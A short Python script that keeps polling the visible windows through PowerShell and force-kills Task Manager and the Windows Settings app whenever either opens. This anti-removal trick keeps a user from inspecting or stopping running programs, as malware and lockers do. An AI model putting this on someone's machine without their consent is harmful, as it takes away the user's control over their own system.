import os
import subprocess

data = ['']


def update():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description' # creating the cmd script var
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) # Executing the script
    for i in proc.stdout:
        if not i.decode()[0].isspace():
            data.append(i.decode().rstrip()) # Append the data

while True:
    update()
    if 'Task Manager' in data:
        os.system("TASKKILL /F /IM Taskmgr.exe")
    if 'Application Frame Host' in data:
        os.system("TASKKILL /F /IM SystemSettings.exe")
    data.clear()